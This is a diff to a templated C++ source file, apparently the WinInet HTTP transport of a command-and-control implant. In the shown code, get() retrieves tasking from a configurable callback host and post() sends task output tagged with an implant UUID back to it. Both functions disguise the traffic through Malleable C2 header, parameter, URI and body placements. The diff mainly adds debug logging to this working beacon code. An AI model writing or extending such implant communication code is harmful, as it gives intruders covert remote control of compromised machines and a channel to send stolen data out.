@@ -23,7 +23,6 @@ Required Keys:
     > both used to mangle the func names a bit, and not have overlapping func names
 #]
 
-
 [% from 'transform.j2' import render_transform %]
 [% from 'transform_reverse.j2' import render_reverse_transform %]
 [% from 'http_add_headers_or_parameters.j2' import render_add_headers_or_parameters %]
@@ -34,15 +33,17 @@ Required Keys:
 using namespace std::string_literals;
 #include "core/settings.h"
 #include "data/transforms/transforms.h"
-#include "debug/debug.h"
+#include "_debug/debug.h"
 
 namespace [[ http_function_name ]] {
     inline std::vector <uint8_t> get(std::vector<uint8_t> metadata_as_msgpack) {
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Initiating GET request for tasking");
         std::string http_response_buffer;
 
         // Hold bytes in a string container, as all the transforms want a string
         // do NOT change the `metadata` var name prior to templating, it's needed for it
         std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Raw Metadata size: " + std::to_string(metadata.size()));
 
         //setup default header, which at minumum contains the useragent
         //!! NOTE: Placeholder value, mc2 does not apply here yet
@@ -69,12 +70,14 @@ namespace [[ http_function_name ]] {
 
         [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
         [% if http_get_client_metadata_terminator == "header" %]
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Placing metadata in header: [[http_get_client_metadata_terminator_value]]");
         headers.push_back(L"[[http_get_client_metadata_terminator_value]]: " + w_metadata);
         [% endif %]
 
         [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
         [#(e.g., /search?q=BASE64...)#]
         [% if http_get_client_metadata_terminator == "parameter" %]
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Placing metadata in parameter: [[http_get_client_metadata_terminator_value]]");
         // Append '?' or '&' depending on existing query string
         if (uri.find(L'?') != std::wstring::npos) {
             uri += L"&";
@@ -88,7 +91,7 @@ namespace [[ http_function_name ]] {
 
         [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
         [% if http_get_client_metadata_terminator == "uri-append" %]
-
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Appending metadata to URI");
         //could use append from transform here too 
         uri += w_metadata;
         [% endif %]
@@ -96,7 +99,7 @@ namespace [[ http_function_name ]] {
 
         [# HTTP_GET: METADATA: PRINT - IF MC2 says it wants a header for where to find the metadata... #]
         [% if http_get_client_metadata_terminator == "print" %]
-
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Placing metadata in request body (print)");
         //convert back to string for HTTP_GET function
         request_body.assign(w_metadata.begin(), w_metadata.end());
         [% endif %]
@@ -111,15 +114,20 @@ namespace [[ http_function_name ]] {
         [% endfor %]
         // --- end --- 
 
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Final URI path: " + std::string(uri.begin(), uri.end()));
+        
         // Call the HTTP_GET
         // Note: We pass the constructed 'uri' and 'headers' here
         //if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, L"[[http_user_agent]]", headers, request_body, http_response_buffer)) {
         if (HTTP_GET(L"[[callback_host]]", [[callback_port]], L"[[http_get_verb]]", uri, headers, request_body, http_response_buffer)) {
 
             if (http_response_buffer.empty()){
+                DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Received empty response from server.");
                 //blank buffer
                 return std::vector<uint8_t> {};
             }
+
+            DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] Data received. Size: " + std::to_string(http_response_buffer.size()));
 
             // --- Reverse Transforms for Server output ---
 
@@ -131,12 +139,17 @@ namespace [[ http_function_name ]] {
             //string -> vector
             std::vector<uint8_t> response_buffer(http_response_buffer.begin(), http_response_buffer.end());
             return response_buffer;
+        } else {
+            DEBUG_LOG("[WinInet::[[ http_function_name ]]::get] HTTP_GET failed to execute.");
         }
+        return std::vector<uint8_t> {};
     }
 
     inline int post(std::string implant_uuid, std::vector<uint8_t> task_response_msgpack_list) {
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Initiating POST for UUID: " + implant_uuid);
         //turn into a string container becuase reasons that I don't remeebr atm
         std::string payload(task_response_msgpack_list.begin(), task_response_msgpack_list.end());
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Raw payload size: " + std::to_string(payload.size()));
 
         // --- Transforms for ID and Output ---
 
@@ -168,14 +181,14 @@ namespace [[ http_function_name ]] {
         // --- Malleable C2 ID/Output transport method ---
 
         [% if http_post_client_id_terminator == "header" %]
-
+            DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Placing ID in header: [[ http_post_client_id_terminator_value ]]");
             //Hold ID in [[ http_post_client_id_terminator_value ]]
             headers.push_back(L"[[ http_post_client_id_terminator_value ]]: " + w_id);
 
         [% endif %]
 
         [% if http_post_client_id_terminator == "parameter" %]
-            
+            DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Placing ID in parameter: [[ http_post_client_id_terminator_value ]]");
             //POST data stored in parameter [[http_post_client_id_terminator]]
             if (uri.find(L'?') != std::wstring::npos) {
                 // URI already has query parameters
@@ -189,7 +202,7 @@ namespace [[ http_function_name ]] {
         [% endif %]
         
         [% if http_post_client_id_terminator == "uri-append" %]
-
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Appending ID to URI");
         //could use append from transform here too
         uri += w_id;
 
@@ -199,20 +212,20 @@ namespace [[ http_function_name ]] {
         // 5. Handle Output Placement
         [# no % here, as otherwise the previous comment adds the below headers line in #]
         [% if http_post_client_output_terminator == "header" %]
-
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Placing payload in header: [[ http_post_client_output_terminator_value ]]");
         headers.push_back(L"[[ http_post_client_output_terminator_value ]]: " + w_payload);
 
         [% endif %]
 
         [% if http_post_client_output_terminator == "print" %]
-
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Placing payload in POST body");
         //convert back to string for HTTP_POST function
         final_post_body.assign(w_payload.begin(), w_payload.end());
 
         [% endif %]
 
         [% if http_post_client_output_terminator == "parameter" %]
-
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Placing payload in parameter: [[ http_post_client_output_terminator_value ]]");
         // This is dangerous for large output, but Malleable C2 allows it
         std::wstring w_body_param(w_payload.begin(), w_payload.end());
         if (uri.find(L"?") != std::wstring::npos) uri += L"&"; else uri += L"?";
@@ -221,7 +234,7 @@ namespace [[ http_function_name ]] {
         [% endif %]
 
         [% if http_post_client_output_terminator == "uri-append" %]
-
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Appending payload to URI");
         //could use append from transform here too
         uri += w_payload;
 
@@ -236,15 +249,17 @@ namespace [[ http_function_name ]] {
 
         // --- End Malleable C2 ID/Output transport method ---
 
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Final POST URI path: " + std::string(uri.begin(), uri.end()));
+
         // send data back to server
         std::string response_buffer;
         if (!HTTP_POST(L"[[callback_host]]", [[callback_port]], L"[[http_post_verb]]", uri, headers, final_post_body, response_buffer)) {
+            DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Error posting data to server.");
             //for debugging, remove cerr on prod
             std::cerr << "Error posting data" << std::endl;
             return 1;
         }
+        DEBUG_LOG("[WinInet::[[ http_function_name ]]::post] Data successfully posted.");
         return 0;
     }
 }
-
-
